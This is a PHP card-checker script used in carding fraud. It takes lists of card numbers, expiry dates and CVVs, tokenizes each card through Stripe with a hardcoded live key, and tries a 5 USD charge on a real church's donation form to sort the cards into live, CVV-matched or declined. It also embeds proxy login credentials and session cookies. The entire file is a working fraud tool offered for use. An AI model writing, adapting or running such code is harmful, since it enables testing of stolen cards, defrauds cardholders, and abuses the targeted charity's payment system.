<?php

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
###CHECKER PART###  
$zip = rand(10001, 90045);
$time = rand(30000, 699999);
$rand = rand(0, 99999);
$pass = rand(0000000000, 9999999999);
$email = substr(md5(mt_rand()), 0, 7);
$name = substr(md5(mt_rand()), 0, 7);
$last = substr(md5(mt_rand()), 0, 7);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: m.stripe.com',
    'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: text/plain;charset=UTF-8',
    'Origin: https://m.stripe.network',
    'Referer: https://m.stripe.network/inner.html'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/api8/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/api8/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "");
$res1 = curl_exec($ch);
$muid = trim(strip_tags(GetStr($res1, '"muid":"', '"')));
$sid = trim(strip_tags(GetStr($res1, '"sid":"', '"')));
$guid = trim(strip_tags(GetStr($res1, '"guid":"', '"')));

/////////////////////==========[Unavailable if empty]==========////////////////
if (empty($schemename)) {
    $schemename = "Unavailable";
}
if (empty($typename)) {
    $typename = "Unavailable";
}
if (empty($brand)) {
    $brand = "Unavailable";
}
if (empty($bank)) {
    $bank = "Unavailable";
}
if (empty($cname)) {
    $cname = "Unavailable";
}
if (empty($phone)) {
    $phone = "Unavailable";
}

    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
          #  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          #curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io"); //your proxy url
         #curl_setopt($ch, CURLOPT_PROXYPORT, "80"); // your proxy port number 
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, "mpysodfss1-rotate:3t8f1wkaib91");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: api.stripe.com',
  'Accept: application/json',
  'Accept-Language: en-US,en;q=0.9',
  'Content-Type: application/x-www-form-urlencoded',
  'Origin: https://js.stripe.com',
  'Referer: https://js.stripe.com/',
  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=36908&guid=42b194f7-c0ca-4311-b745-efc0056b12509324a3&muid=7cb4d37f-bb9a-46b7-a762-093edbe9e45431ebc3&sid=ca230305-32ac-4f08-b5cf-45cc2c649a26d408a0&key=pk_live_kkIOioqvMQs4lec76gX9Ap5R&payment_user_agent=stripe.js%2F78ef418&card[name]=$name+verma&card[number]=$cc&card[exp_month]=$mes&card[exp_year]=$ano");
$result1 = curl_exec($ch);
$id = GetStr($result1,'id": "','"');
$msg1 = GetStr($result1,'"message": "','"');

$url = "https://www.churchofgodpacoima.com/wp-admin/admin-ajax.php";
$curl = curl_init($url);
#curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io"); //your proxy url
#curl_setopt($ch, CURLOPT_PROXYPORT, "80"); // your proxy port number 
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, "mpysodfss1-rotate:3t8f1wkaib91");
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   'Accept: application/json, text/javascript, */*; q=0.01',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Cookie:pdb-sess=f1bff99d3850fb45481804f49968f247; __stripe_sid=24387877-2174-4def-b966-17a3be698bd9da975c; __stripe_mid=00b793b7-740f-48c5-884c-97d52dea0d1b7d066f',
'Host: www.churchofgodpacoima.com',
'Origin: https://www.churchofgodpacoima.com/',
'Referer: https://www.churchofgodpacoima.com/donate/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
'X-Requested-With: XMLHttpRequest',
'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data = "action=wp_full_stripe_payment_charge&formName=Donation&fullstripe_name=$name+verma&fullstripe_email=$name%40gmail.com&fullstripe_custom_input=&fullstripe_custom_amount=5&fullstripe_address_line1=7215+Skillman+St+%23300&fullstripe_address_line2=&fullstripe_address_city=Dallas&fullstripe_address_state=Texas&fullstripe_address_zip=$zip&stripeToken=$id";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$result2 = curl_exec($curl);
$errormessage = trim(strip_tags(GetStr($result2,'"code":"','"')));


           if (strpos($result2, 'Payment Successful!')) {
    $msg2= 'Charge 5 USD ✅';
    $res= 'Sucessfully charge 5$';
  
}
elseif (strpos($result2, 'Thank you') || (strpos($result2, "thank you"))) {
    $msg2= 'Charge 5 USD ✅';
    $res= 'Sucessfully charge 5$';
  
}
elseif (strpos($result2, "Your card has insufficient funds") || (strpos($result2, "insufficient_funds"))) {
    $msg2= 'Insufficient Funds ✅';
    $res=  'CVV Matched ✅';
  
}
elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))) { 
    $msg2= '3D Card ✅';
    $res=  'CVV Matched ✅';
  
}
elseif(strpos($result2,'"cvc_check": "pass"')) {
    $msg2= 'Payment Cannot Be Completed';
    $res=  'CVV Matched ✅';
  
}
elseif(strpos($result2,'"code": "incorrect_cvc"')) {
    $msg2= 'CVV Mismatch';
    $res=  'CCN Live ✅';
  
}
elseif(strpos($result2,'"code": "incorrect_cvc"') || (strpos($result2, "Your card's security code is incorrect")) || (strpos($result2, "security code is invalid"))) {
    $msg2= 'CVV Mismatch';
    $res=  'CCN Live ✅';
  
}  
elseif (strpos($result1, "transaction_not_allowed") || (strpos($result2, "Your card does not support"))) {
    $msg2= 'Transaction Not Allowed';
    $res=  'CVV Matched ✅';
  
}
elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))) 
{
    $msg2= 'Declined  🞬';
    $res=  'Fraudulent ✘';
}
elseif ((strpos($result1, "Invalid account")) || (strpos($result2, "Invalid account"))) {
    $msg2= 'Invalid account  🞬';
    $res=  'Invalid account ✘';
}
 elseif ((strpos($result1, "Try again in a little bit")) || (strpos($result2, 
"Try again in a little bit"))) 
{
    $msg2= 'Try again in a little bit 🞬';
    $res=  'Try again in a little ✘';
}
elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))) {
    $msg2= 'Expired Card 🞬';
    $res=  'Declined ✘';
}
elseif ((strpos($result1, "generic_decline")) || (strpos($result2, "generic_decline"))) {
    $msg2= 'Generic Declined 🞬';
    $res=  'Declined ✘';
}
elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))) {
    $msg2= 'Do Not Honor 🞬';
    $res=  'Declined ✘';
}
elseif ((strpos($result1, "Your card was declined")) || (strpos($result2, "Your card was declined"))) {
    $msg2= 'Your Card Was Declined 🞬';
    $res=  'Declined ✘';
}
elseif ((strpos($result1, 'Your card number is incorrect')) || (strpos($result2, 'Your card number is incorrect'))) {
    $msg2= 'Card Number Is Incorrect 🞬';
    $res=  'Declined ✘';
}
elseif ((strpos($result1, 'invalid_expiry_year')) || (strpos($result2, "Your card's expiration year is invalid"))) {
    $msg2= "Your card's expiration year is invalid 🞬";
    $res=  'Declined ✘';
}
          elseif ((strpos($result1, 'invalid_expiry_month')) || (strpos($result2, "Your card's expiration month is invalid"))) {
    $msg2= "Your card's expiration month is invalid 🞬";
    $res=  'Declined ✘';
}
          elseif(strpos($result1,'testmode_charges_only')) {
     $msg2= "SK key revoked 🞬";
    $res=  'Chnage Sk Key by 🞬';
}
          elseif(strpos($result1,'api_key_expired')) {
    $msg2= "SK key Expired,Donate Sk Key 🞬";
    $res=  "$sec 🞬";
}
else{
    $msg2= $result2;
    $res=  "$errormessage  🞬";
}
#========================================================================
echo"┠ Status ⇝ $res Resp ⇝ $msg2";
?>

